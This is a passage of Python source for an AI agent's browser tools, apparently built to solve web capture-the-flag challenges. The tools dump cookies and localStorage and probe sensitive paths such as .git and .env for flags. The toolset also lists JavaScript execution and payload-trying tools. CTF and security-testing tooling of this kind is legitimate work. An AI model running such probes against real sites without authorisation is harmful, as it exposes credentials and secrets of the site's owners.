        lines.append(f"  {cookie.get('name')}:")
        lines.append(f"    Value: {cookie.get('value', '')}")
        lines.append(f"    Domain: {cookie.get('domain', '')}")
        lines.append(f"    Path: {cookie.get('path', '/')}")
        lines.append(f"    HttpOnly: {cookie.get('httpOnly', False)}")
        lines.append(f"    Secure: {cookie.get('secure', False)}")

    return "\n".join(lines)


@tool
async def get_local_storage() -> str:
    """Get localStorage data from the current page.

    Returns:
        Formatted localStorage key-value pairs.
    """
    browser = get_browser()
    storage = await browser.get_local_storage()

    if not storage:
        return "localStorage is empty"

    lines = [f"localStorage ({len(storage)} items):\n"]
    for key, value in storage.items():
        value_str = str(value)[:100]
        lines.append(f"  {key}: {value_str}")

    return "\n".join(lines)


@tool
async def try_sensitive_paths() -> str:
    """Try accessing common sensitive paths like robots.txt, .git, .env, etc.

    Returns:
        Results of trying to access sensitive paths.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    base_url = browser.get_current_url()
    # Get base domain
    from urllib.parse import urljoin, urlparse
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    paths = get_payloads("sensitive_paths")
    results = ["Checking sensitive paths:\n"]

    for path in paths[:10]:  # Check first 10
        if isinstance(path, tuple):
            path = path[0]

        full_url = urljoin(base, str(path))
        try:
            await browser.navigate(full_url)
            html = await browser.get_page_content()

            # Check for 404 indicators
            is_404 = "404" in html[:500] or "not found" in html.lower()[:500]

            result = f"  {path}: "
            if is_404:
                result += "404 Not Found"
            else:
                # Check for flag
                from ..utils.flag_detector import detect_flag
                flag = detect_flag(html)
                if flag:
                    result += f"FLAG FOUND: {flag}"
                    results.append(result)
                    return "\n".join(results) + f"\n\n*** FLAG: {flag} ***"
                else:
                    result += f"Found content ({len(html)} bytes)"

            results.append(result)

        except Exception as e:
            results.append(f"  {path}: Error - {e}")

    # Navigate back to original
    await browser.navigate(base_url)

    return "\n".join(results)


@tool
async def type_slowly(selector: str, text: str) -> str:
    """Type text character by character into an input field.

    Useful when fill() doesn't trigger expected events.

    Args:
        selector: CSS selector for the input.
        text: Text to type.

    Returns:
        Status message.
    """
    browser = get_browser()
    result = await browser.type_text(selector, text)
    return result


# Collect all tools
ALL_TOOLS = [
    navigate_to_url,
    click_element,
    fill_input,
    get_page_state,
    execute_javascript,
    check_for_flag,
    analyze_page_visually,
    list_interactive_elements,
    get_network_traffic,
    get_page_source,
    find_element_by_text,
    submit_form,
    request_human_help,
    try_common_payloads,
    scroll_page,
    go_back,
    wait_for_element,
    get_cookies,
    get_local_storage,
    try_sensitive_paths,
    type_slowly,
]
